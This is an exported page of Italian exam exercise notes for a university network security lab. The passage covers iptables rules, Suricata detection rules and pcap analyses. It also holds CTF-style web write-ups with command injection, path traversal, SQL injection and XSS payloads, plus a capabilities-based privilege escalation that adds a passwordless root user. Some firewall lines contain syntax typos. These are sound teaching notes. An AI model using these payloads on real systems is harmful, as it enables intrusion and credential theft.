	#Regole per default deny
	iptables -P FORWARD DROP
	iptables -P INPUT DROP
	iptables -P OUTPUT DROP
	
#Regole Server
	#Regole per servizio SMTP
	iptables -A INPUT -i eth1 -s 130.136.5.0/8 -d 172.16.0.1 -p tcp --dport 25 -j ACCEPT
	iptables -A OUTPUT -o eth1 -d 130.136.5.0/8 -s 172.16.0.1 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT
	
	#Regole per servizio LDAP
	iptables -A INPUT -i eth1 -s 172.16.15.254 -d 172.16.0.1 -p tcp --sport 389 -m state --state ESTABLISHED -j ACCEPT
	iptables -A OUTPUT -o eth1 -d 172.16.15.254 -s 172.16.0.1 -p tcp --dport 389 -j ACCEPT 
	
	#Regole per default deny
	iptables -P INPUT DROP
	iptables -P OUTPUT DROP</code></pre></details></li></ul><ul id="0bbe52b0-cb1c-40aa-ae0b-46e403ef7d7f" class="toggle"><li><details open=""><summary>8 febbraio 2023</summary><p id="838769e4-a43e-4e54-a692-62558e1d6532" class="">Le regole da inserire per bloccare l’attacco e consentire quello lecito sono:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="482ae7a1-9045-403a-8b33-39521377a959" class="code"><code class="language-JavaScript">#Comandi per svuotare le catene 
iptables -F INPUT
iptables -F OUTPUT
iptables -F FORWARD

#Comandi per consentire il traffico DHCP
iptables -A INPUT -p udp --sport 68 --dport 67 -j ACCEPT
iptables -A OUTPUT -p udp --sport 67 --dport 68 -m state --state ESTABLISHED -j ACCEPT

#Comandi per consentire il traffico DNS
iptables -A INPUT -d 172.23.3.1 -s 172.23.3.187 -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -s 172.23.3.1 -d 172.23.3.187 -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT 

#Comandi per consentire traffico NTP
iptables -A FORWARD -s 172.22.2.159 -d 172.23.3.187 -p udp --sport 123 --dport 123 -j ACCEPT 
iptables -A FORWARD -d 172.22.2.159 -s 172.23.3.187 -p udp --sport 123 --dport 123 -m state --state ESTABLISHED -j ACCEPT

#Comando per consentire il traffico POP
iptables -A FORWARD -s 172.22.2.159 -d 172.21.1.118 -p udp --sport 110 -m state --state ESTABLISHED -j ACCEPT
iptables -A FORWARD -d 172.22.2.159 -s 172.21.1.118 -p udp --dport 110 -j ACCEPT

#Comando per consentire traffico SSH
iptables -A FORWARD -s 172.22.2.159 -d 172.23.3.187 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -d 172.22.2.159 -s 172.23.3.187 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

#Comando per consentire traffico TLS
iptables -A FORWARD -s 172.21.2.118 -d 172.22.2.159 -p tcp --dport 993 -j ACCEPT   
iptables -A FORWARD -d 172.21.2.118 -s 172.22.2.159 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT

#Comandi per default deny
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP</code></pre><p id="d37dead4-269a-4225-997c-429a62f57db7" class="">ATTENZIONE!</p><p id="2e0e2ea5-8bb4-44b5-9dce-dc7e5f50f3d3" class="">Bisogna fare attenzione al traffico POP</p><figure id="faa7c5c4-d4dd-4de6-af87-0111dc8c8749" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2027.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2027.png"/></a></figure><p id="11930c2d-4e7d-4dc8-8403-1efff7490eea" class="">Da questa immagine sembra che il pacchetto con sorgente 172.22.2.159 sia il primo ad essere transitato, quindi inserire -m state —state ESTABLISHED non avrebbe senso. In realtà però il server è 172.22.2.159 di conseguenza è giusto inserire l’opzione precedente</p></details></li></ul><ul id="ee7e1321-98a4-4fc3-919b-c5717e6b59c0" class="toggle"><li><details open=""><summary>esercizio github (uguale all’esercizio 11 giugno 2021)</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eeacf0e1-74e6-4a44-aef0-65ef1b69ef80" class="code"><code class="language-JavaScript">#Comandi per svuotare le catene
iptables -F FORWARD
iptables -F INPUT
iptables -F OUTPUT

#Comandi per consentire qualsiasi traffico sull&#x27;interfaccia di loopback
iptables -A INPUT -i lo -j ACCEPT 
iptables -A OUTPUT -i lo -j ACCEPT

#Comandi per consentire il traffico delle connessioni HTTP entranti
iptables -A INPUT -p tcp -dport 80 -j ACCEPT 
iptables -A OUTPUT -p tcp -sport 80 -m state --state ESTABLISHED -j ACCEPT 

#Comandi per consentire connessioni SSH uscenti verso la rete host-only 192.168.56.0/24
iptables -A INPUT -s 192.168.56.0/24 -p tcp -sport 22 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -d 192.168.56.0/24 -p tcp -dport 22 -j ACCEPT

#Comandi per bloccare l&#x27;inoltro del traffico proveniente dalla rete host-only verso altre destinazioni
iptables -A FORWARD -s 192.168.56.0/24 -j DROP
iptables -A FORWARD -d 192.168.56.0/24 -j DROP

#Comandi consentire la risoluzione dei nomi DNS
iptables -A INPUT -p udp -sport 53 -m state --state ESTABLISHED -j ACCEPT 
iptables -A OUTPUT -p udp -dport 53 -j ACCEPT

#Comandi per bloccare traffico in entrata
iptables -P INPUT DROP 

</code></pre></details></li></ul></details></li></ul><ul id="50173528-a1e6-4c2f-9cc4-6d80ea30ebaa" class="toggle"><li><details open=""><summary>NID</summary><ul id="b4bdc374-7e3a-49e1-a37f-c080258e5ebf" class="toggle"><li><details open=""><summary>10 febbraio 2023</summary><p id="4baa61ae-3956-474b-b204-c6da22e19e6a" class="">Sono presenti tre differenti regole da definire:</p><ul id="ba7554e4-2e30-4f80-8b48-3e1ed82b366a" class="bulleted-list"><li style="list-style-type:disc">La regola suricata in modalità alert per TUTTO il traffico icmp SOLTANTO IN ENTRATA sulla rete 192.168.X.X è la seguente:<p id="db176132-2b7d-431f-bdf9-d586deab04d6" class=""><code>alert icmp $HOME_NET any -&gt; $HOME_NET any (msg:&quot;Traffico icmp da rete 192.168.0.0/16&quot;;sid:100001;rev:1;)</code></p><p id="1f771533-168d-4f45-8934-06187c0ea260" class="">Si è deciso di porre HOME_NET anche in entrata in quanto tale rete è l’interfaccia host only di virtualbox, che mette in comunicazione la VM con la macchina host e le altre VM collegate che presentano tale interfaccia. Di conseguenza, i pacchetti in entrata sulla HOME_NET provengono dalla HOME_NET stessa. </p><figure id="2c3fdc6d-9178-4d4f-b16d-9a7e29f5cce5" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2028.png"><img style="width:652px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2028.png"/></a></figure><p id="9a9ed569-02dd-4225-b5af-1b6c849766b7" class="">Si è lanciato il comando suricata -c /etc/suricata/suricata.yml -i eth1</p></li></ul><ul id="f67e3e4a-65c0-41fb-8dfe-ba14fd19e167" class="bulleted-list"><li style="list-style-type:disc">La regole suricata in modalità alert per qualsiasi richiesta a evilcorp.com sono:<p id="4ad0e65d-db2d-4ce0-86e8-4a96394ced7e" class="">alert dns 10.0.2.15 any → 10.0.2.3 any (msg:”Richiesta DNS per evilcorp.com”;content:”evilcorp.com”;sid:100001;rev:1;)</p><p id="b9c78bea-8521-4f87-84a2-00dcfccf500b" class="">alert ip any any -&gt; evilcorp.com any (msg:&quot;Request for evilcorp.com&quot;; sid:100003; rev:1;)</p><p id="d5e19ab6-293a-453f-8bab-8f806cad5b14" class="">Si è lanciato il comando suricata -c /etc/suricata/suricata.yml -i eth0</p></li></ul><ul id="e8d51ba4-9be7-4b59-9c47-e55dd4df7e09" class="bulleted-list"><li style="list-style-type:disc">I due indirizzi in gioco sono 192.168.56.1 e 192.168.56.8 con il primo che instaura una connessione TELNET con il secondo, provanda a fare login. La porta di riferimento del destinatario è la porta 23, mentre quella il traffico del mittente comprende l’utilizzo di più porte, quelle che si possono osservare sono 41830, 41834, 41846 e 41852. Il login risulta corretto con l’inserimento dell’utente sec e la password sec. La regola è del tipo:<p id="55bbb7bf-8a04-4aff-8dfd-339c0b424d39" class=""><code>alert tcp 192.168.56.1 any -&gt; 192.168.56.8 23 (msg:&quot;Flag detected&quot;;content:&quot;sec:sec&quot;; sid:100005; rev:1;)</code></p><figure id="71d4c4e8-78da-4eb4-9a54-76f8195f2d66" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2029.png"><img style="width:455px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2029.png"/></a></figure></li></ul></details></li></ul><ul id="37a22621-1bf5-4d2e-8371-dcc53e27e35e" class="toggle"><li><details open=""><summary>11 gennaio 2024</summary><p id="0fdf2acc-b568-4087-bdfb-c0a973be9a2d" class="">Osservando il traffico contenuto all’interno del fle pcap è possibile notare:</p><ul id="2e42c25a-b14d-4d7b-aff3-ef9fbb2f6e75" class="bulleted-list"><li style="list-style-type:disc">Invio di una molteplicità di pacchetti SYN frammentati da sorgenti differenti tutte dirette alla porta 80 del server. Questo sottolinea un possibile attacco di DDoS.</li></ul><ul id="d07532ad-6ce2-42cf-bc88-e31111fcc1ec" class="bulleted-list"><li style="list-style-type:disc">Il server instaura due connessioni TCP con due client differenti ovvero 10.10.31.2 e 10.10.5.21 che, tramite protocollo telnet, inviano dei dati contenenti la FLAG{this_port_is_dangerous} rispettivamente dalle porte 58810 e 57666. </li></ul><ul id="98ad54bf-a121-423c-9162-5f80fad3efaf" class="bulleted-list"><li style="list-style-type:disc">La maggior parte del traffico generato riguarda però la connessione TCP il server instaura con il client 10.10.3.1. Nel merito di questa connessione è possibile osservare due normali connessioni ssh e l’invio di molti pacchetti SYN da parte del client con risposte a porte differenti da parte del server, che sottolineano un port scan. </li></ul><p id="44e4c4cd-370f-4048-b739-e4064b786537" class="">La FLAG individuata può essere registrata attraverso la seguente regola suricata:</p><p id="2cba2ee4-73d0-48c2-afc9-a7495cd02150" class=""><code>alert tcp 10.10.0.0/16 any → 10.10.10.10 23 (msg:”FLAG detected”;content:”FLAG{this_port_is_dangerous}”;sid:100001;rev:1;)</code></p><p id="61126bcc-e137-4ba2-9705-8a70fa141b8d" class="">Il payload si può recuperare attraverso il seguente comando:</p><figure id="19a5b75a-8954-4c82-83a2-1223543cc10e" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2030.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2030.png"/></a></figure></details></li></ul><ul id="9fec9400-c6df-45d6-9f3c-7d88152cca0d" class="toggle"><li><details open=""><summary>8 febbraio 2024</summary><p id="66d45f7c-8b0e-4f24-b235-3f57a720b044" class="">Analizzando il traffico contenuto all’interno del file pcap, si possono notare varie tipologie di traffico come ARP, DHCP, DNS, HTTP, NTP, SSH e POP. Osservando meglio i pacchetti è possibile notare che quelli riferiti al protocollo HTTP rappresentano un tentativo di brute forcing: Infatti, analizzando il contenuto applicativo dei pacchetti, si può notare che le richieste vengono eseguite dal motore di ricerca hydra per provare ad autenticarsi come admin, tentando l’inserimento di numerose password l’una sempre diversa dall’altra. </p><figure id="d66e60b9-1941-4688-92ae-678a83454e72" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2031.png"><img style="width:432px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2031.png"/></a></figure><p id="7ffbdd6c-6428-4eb6-9375-0cb372a0aadd" class="">Osservando meglio leinformazioni contenute negli altri livelli dello stack TCP/IP è possibile vedere che il traffico viene generato da 172.21.1.118 con porta sempre variabile verso la destinazione 172.22.2.159 alla porta 80. Di conseguenza è possibile scrivere le due regole di suricata che sono del tipo:</p><p id="67294ee7-9b53-465e-88a1-f657d07f1f41" class=""><code>alert tcp 172.21.1.118 any → 172.22.2.159 80 (msg:”Tentativo di brute forcing”;content:”/api/index.html”;sid:100001;rev:1;)</code></p><p id="7402c673-4bf2-4171-b60f-2bb0db43ec30" class=""><code>alert tcp 172.22.2.159 80 → 172.21.1.118 any (msg:”Risposta al tentativo di brute forcing”; content:”401”;sid:100002;rev:1;)</code></p></details></li></ul></details></li></ul><ul id="0c5e1e16-0ae7-48fb-bc56-bcd36ee42e78" class="toggle"><li><details open=""><summary>web security</summary><ul id="32ed953e-ec21-4adf-831b-698bd5567e12" class="toggle"><li><details open=""><summary>web_ce.py E web_ce1.py E web_ce2.py E web_ce3.py E web_ce4.py E web_ce5.py </summary><p id="9d7c0146-cdd3-4430-84b3-4eb274e0563a" class="">L’obbiettivo è recuperare il file /etc/passwd. Si esegue una command injection sostituendo all’URL ulisse.unibo.it un qualsiasi comando e si nota che il comando nslookup fallisce. Di conseguenza, per provare a passare il fallimento del primo comando si inserisce il carattere | per eseguire in pipe un altro comando (si può utilizzare anche || che esegue il secondo comando se il primo fallisce). Così facendo si utilizza la seguente command injection:</p><p id="873c6052-39bf-40da-8122-a86de5b828d3" class="">|| cat /etc/passwd</p><figure id="faf8f7ce-0655-48e4-b777-de44303d44aa" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2032.png"><img style="width:504px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2032.png"/></a></figure><p id="862da567-476e-49a3-969b-0b8b42725569" class="">Per sfuggire a questo filtro utilizziamo un altro comando di visualizzazione come more:</p><figure id="ffb140f0-ef6a-43c0-a402-14878b7abe65" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2033.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2033.png"/></a></figure><p id="54e6246a-088f-4597-a081-d6027c115dd4" class="">Per sfuggire a questo filtro si possono operare diverse azioni:</p><ul id="f1897c8c-ee4e-4814-a38c-dfb7b0fac44a" class="bulleted-list"><li style="list-style-type:disc">La prima riguarda la modifica del file ricercato con l’inseriemento di caratteri * o ?, che vedono la sostituzione del carattere con tutti i file che fanno match</li></ul><ul id="febe5898-e538-4ee3-a0e7-9724fe4afb39" class="bulleted-list"><li style="list-style-type:disc">Il secondo è la concatenazione del comando tee che serve per ridirigere il contenuto di un file. Senza specificare nessun file il contenuto viene ridiretto su stdout</li></ul><p id="829e90f3-a912-4f14-8185-e82f04b28222" class="">La command injection finale è del tipo:</p><p id="e4f8f306-5246-4cec-a4a6-1ae7819fbcac" class="">|| cat /etc/passwd | tee</p><figure id="bb7ea475-e8d1-41a2-89a6-64431eaf86bf" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2034.png"><img style="width:480px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2034.png"/></a></figure></details></li></ul><ul id="583c0b95-f7ec-4450-ad32-1c18e7bda4b9" class="toggle"><li><details open=""><summary>web_pt.py e web_pt1.py</summary><p id="a71209dd-0fd1-4e9f-a48a-6f5849c76e68" class="">Lo scopo dell’esercitazione è estrarre il contenuto del file /etc/passwd. Di conseguenza provo a digitare il seguente URL</p><p id="2c68c1f0-3efb-4195-a5a3-3c256e398ec5" class="">/etc/passwd</p><figure id="ff2deec8-e4ba-45ef-b9f2-f540548f02a7" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2035.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2035.png"/></a></figure><p id="ddbb80f9-3e1c-4f2d-9773-64bdab489239" class="">Provo a reperire il file inziando il path con .., posizionandomi nella cartella padre:</p><figure id="df2943f8-7fcf-4b19-899c-146190c6e1ce" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2036.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2036.png"/></a></figure><p id="2a832359-a6b8-422b-ae76-247e114dc9b1" class="">Per ovviare a questo problema inizio il path con . per dire dalla cartella corrente. </p><figure id="cd14bd73-a158-4620-9501-d80cd532ecc0" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2037.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2037.png"/></a></figure><p id="10d1f551-6c9d-45a7-a78b-31e0801dd14c" class="">Questo filtro si può bypassare sostituendo uno dei due caratteri terminali con ? o *. Applicando la sostituzione si può notare che la get fallisce, forse il path non è corretto. Per questo motivo si può provare a cambiare il path spostandosi nelle cartelle padre. Applicando questo ragionamento, componendo il path:</p><p id="b13e98ec-76cf-42b0-a777-971a951f71a0" class="">./../../etc/passwd</p><p id="542fed99-34c2-4981-a396-dcb47330d7d3" class="">si ottiene il file ricercato:</p><figure id="52d91ad0-7154-4791-9175-df9323d2597f" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2038.png"><img style="width:521px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2038.png"/></a></figure></details></li></ul><ul id="e2377f69-26a6-4762-9470-8a5566300cd2" class="toggle"><li><details open=""><summary>web_sqli.py</summary><p id="196fb092-197b-4f4c-830c-78e51ff71306" class="">Lo scopo dell’esercitazione è quello di riuscire ad eseguire una sql injection al fine di autenticarsi come admin. Per prima cosa si prova ad inserire la seguente stringa:</p><p id="a32a7ec0-a7cb-4f23-a376-b77945048a04" class="">username=admin&amp;password=’ OR ‘1’ = ‘1</p><p id="006c52b3-a67b-4d08-b978-f9e1e3871345" class="">Tale attacco, però, presenta due differenti errori: non si può usare il carattere = ed è stato disabilitato OR. Per quanto riguarda il primo filtro si prova a rimuovere la prima parte dell’espressione, mentre per quanto riguarda il secondo si prova a vedere se il filtro è sensibile o meno alle minuscole. Per questo motivo si prova ad inserire la seguente stringa:</p><p id="93b68a66-8aef-4f2e-a8b6-14c325b7e9c5" class="">username=admin&amp;password= oR ‘1</p><p id="b28d2772-53eb-40d0-95b8-35280db4c047" class="">Tale stringa, per pochi secondi, fa intravedere la flag dell’esercitazione, ma subito dopo si ritorna alla pagina dell’esercitazione. Per catturare il contenuto della flag si utilizza il browser di Burp, intercettando la richiesta e inviandola al repeater. In questo modo è possibile bloccare la risposta che contiene la seguente flag:</p><p id="8bc4340f-4b9b-4361-bb3d-60c061560eaf" class="">SEC{Today_a_young_man_on_acid_realized_that_all_matter_is_merely_energy_condensed_to_a_slow_vibration_that_we_are_all_one_consciousness_experiencing_itself_subjectively,_there_is_no_such_thing_as_death,_life_is_only_a_dream,_and_we_are_the_imagination_of_ourselves._Here&#x27;s_Tom_with_the_weather.}</p></details></li></ul><ul id="94bc3846-3174-48b8-ab53-f2ed10a1480f" class="toggle"><li><details open=""><summary>xss e xss1</summary><p id="d1290590-55d6-43bd-bae0-586771566a26" class="">é presente un form che può essere sfruttato per l’inserimento di codice html. Inserendo una stringa casuale si vede l’output del codice e i filtri che sono stati utilizzati:</p><figure id="1b4d28cd-4107-4519-8a0d-b4e4f6962a3c" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2039.png"><img style="width:288px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2039.png"/></a></figure><p id="ab959be6-4909-4b1d-8bc9-3c93edc812b5" class="">Si può notare che l’input inserito all’interno del form compone la src del tag img e che non si possono utilizzare &lt;&gt; per sfuggire al tag, di consguenza è necessario comporre l’xss all’interno del tag stesso. Per questo mnotivo si decide di comporre la seguente stringa:</p><p id="242b947f-f8c1-440c-8cb7-d62477d13aff" class=""><code>hacker&quot; onerror=alert(&quot;hackerato&quot;) &quot; </code></p><p id="985cf6dd-b147-4cf4-b1f5-e3f3ce355f8e" class="">La stringa hacker rappresenta la source della foto. Ovviamente tale source è puramente fittizia e di conseguenza provocherà l’esecuzione dell’evento onerror con la comparsa dell’alert:</p><figure id="acdd29aa-6b80-476c-8fb7-c28b635feaaf" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2040.png"><img style="width:336px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2040.png"/></a></figure></details></li></ul></details></li></ul><ul id="56d7ee03-6034-42b5-ab32-cf4dc33d40e5" class="toggle"><li><details open=""><summary>esame 15_07_22</summary><ul id="bd4b2087-5e27-4528-a7dc-ff369f4823ac" class="toggle"><li><details open=""><summary>privesc</summary><p id="3b39fc96-9884-41e8-8a45-37863c30d119" class="">Il sistema è stato predisposto attraverso l’utilizzo di AIDE, HIDS utilizzato per eseguire integrity checking. All’interno del file di configurazione /etc/aide/aide.conf vengono eseguite due modifiche:</p><ul id="e9bc3e32-4e8c-4e59-af73-2b9449927b57" class="bulleted-list"><li style="list-style-type:disc">Viene commentata la riga per l’inclusione dei controlli presenti nella cartella /etc/aide/aide.conf.d/</li></ul><ul id="2f6ac055-1e85-4a0f-89b6-1cfac9790c5a" class="bulleted-list"><li style="list-style-type:disc">Vengono inseriti i controlli necessari per l’esercizio, ovvero:<ul id="6244fee4-1f40-45f8-b5b0-31efe674ca7a" class="bulleted-list"><li style="list-style-type:circle">/usr/bin/* f R</li></ul></li></ul><p id="ffe59d9a-2ae7-4588-b9fa-5032949dc7f0" class="">In seguito a tale modifica, viene eseguito il comando:</p><p id="8684ca58-d88d-4be7-a8e6-b1d91f06eebe" class="">sudo aideinit</p><p id="8eacd36e-fba1-4ad7-9876-fc6b9300845d" class="">Tale comando serve per eseguire l’istantanea del mio sistema in assenza di misconfiguration, con la creazione di due differenti db ovvero /var/lib/aide/aide.db e /var/lib/aide/aide.db.new. Dopo questa operazione è possibile eseguire il binario che apporta le modifiche. In seguito si esegue il comando:</p><p id="18ceaac5-0c92-4a61-b2de-86d1bd67a0c7" class="">sudo aide -c /etc/aide/aide.conf -C</p><p id="52f2f75a-ffd0-4a0d-860c-7d11ed06e93d" class="">Tale comando confronta il mio sistema con le istantanea /var/lib/aide/aide.db, restituendo all’utente le differenze:</p><figure id="03cbef84-d392-4405-a58e-1d0dacac9560" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2041.png"><img style="width:432px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2041.png"/></a></figure><p id="2fe57b05-fca5-4f3d-ae5b-1d043b8106c2" class="">come si può notare dall’output appena riportato, il comando /usr/bin/tee sempre che abbia ricevuto una modifica delle capabilities. Si analizza meglio la modifica tramite il comando getcap come riportato nelle seguente figura:</p><figure id="b02bb0e6-d315-49a8-ad9b-d6278cae7e35" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2042.png"><img style="width:388px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2042.png"/></a></figure><p id="47ca5a6b-ab55-481c-aa66-c9023bd2159d" class="">Grazie all’ouput riportato è possibile vedere che è stato assegnato al comando tee la capability CAP_DAC_OVVERIDE=eip che permette di ignorare i permessi sul file system. Tale comando può essere utilizzato per eseguire privilege esclation per ridirigere in append, all’interno dei file /etc/passwd e /etc/shadow, le seguenti due stringhe: </p><p id="349a605e-1523-4260-b3e6-674dcee7a943" class="">toor:x:0:0:toor:/root:/usr/bin/zsh</p><p id="5e395e28-1840-4590-8c1f-ae3c8d60f1d7" class="">toor::::::::</p><p id="d4f8cf88-93ca-4e17-8b19-852701085d8f" class="">In questo modo si è aggiunto un utente con privilegi di root e senza l’utilizzo di password. I comandi eseguiti sono riportati nella seguente figura. </p><figure id="77ee78d6-7380-4c0e-bc27-e2788fe51e36" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2043.png"><img style="width:480px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2043.png"/></a></figure></details></li></ul><ul id="e8d2a071-2921-4559-93f1-d307bd2988bd" class="toggle"><li><details open=""><summary>suricata</summary><p id="88bf5003-896c-43d9-abdc-63e70c8a502b" class="">Analizzando il file fornito è possibile individuare le flag all’interno del traffico del protocollo HTTP, nelle richieste che vedono come sorgente 192.168.56.1 con porta variabile e destinazione 192.168.56.8 porta 80. Visto che la flag dell’ esercizio deve avere la struttura del tipo flag={flagesame15uglio}, ma potrebbero esserci più flag con la stessa struttura ma differente contenuto, la regola suricata utilizzata per catturare il traffico contenente la flag è la seguente:</p><p id="bdababb7-5339-405e-a97f-883a9b5ccc49" class=""><code>alert tcp 192.168.56.1 any -&gt; 192.168.56.8 80 (msg:&quot;Flag detected&quot;;content:&quot;flag=SEC&quot;;sid:100005; rev:1;)</code></p><p id="e1766a94-202b-4f83-ba38-75d3c573fffc" class="">é stato utilizzato lo specifico campo di content in quanto tutte le flag, anche quelle con contenuto sbagliato, presentano tale parte iniziale. Il file di configurazione di suricata è stato modificato per vedere il payload del traffico, decommentando l’opzione payload-printable. Lanciando il comando </p><p id="7a3141f1-76e3-417f-a3c7-7d1f08e383c5" class=""><code>sudo suricata -c /etc/suricata/suricata.yml -r file.pcapng </code></p><p id="8891c330-0f43-431c-9fd7-a67f58c2da04" class="">si analizza in modalità offline il traffico contenuto all’interno del file dell’esercizio. I log generati dalla regola sopra riportata si possono osservare attraverso il comando:</p><p id="9e1bb1a2-7055-436d-a4ab-990e8d601277" class=""><code>cat  /var/log/suricata/eve.json | jq &#x27;select(.event_type=&quot;alert&quot;)&#x27; | egrep payload_printable</code></p><p id="fae165fc-840b-41f3-9086-1c54d7772c99" class="">Nella seguente foto sono riportati il campo payload dei log generati: </p><figure id="8ff43c62-929f-4eaa-b96d-cb143e7766b5" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2044.png"><img style="width:491px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2044.png"/></a></figure><p id="9cf94db4-6e54-4120-b726-ddd19f33a5d4" class="">Tra i payload riportati in figura nessuno riporta la flag da trovare. Il payload di una richiesta, però, sembra codificato in base64 di conseguenza si decodifica il contenuto attraverso il comando:</p><p id="57747727-df02-4557-8168-ae2633b6f8a7" class=""><code>echo “payload” | base64 -d </code></p><p id="01d812f4-b71a-4d73-9a9f-0eb03f84b797" class="">Tale comando restituisce la stringa “flagesame15luglio” di conseguenza siamo dinanzi alla flag corretta. L’unica ambiguità è relativa ai caratteri %7 prima e %7D dopo il payload, che dovrebbero esser stati provocati dalla decodifica URL dei caratteri {}. Per verificarlo si utilizza il decoder di Burp, confermando quanto appena riportato:</p><figure id="888df002-32bb-4e69-b22a-bb07996858c5" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2045.png"><img style="width:491px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%2045.png"/></a></figure></details></li></ul></details></li></ul><p id="9bf01a33-6320-4d6f-97b9-cf5c08ccfce5" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>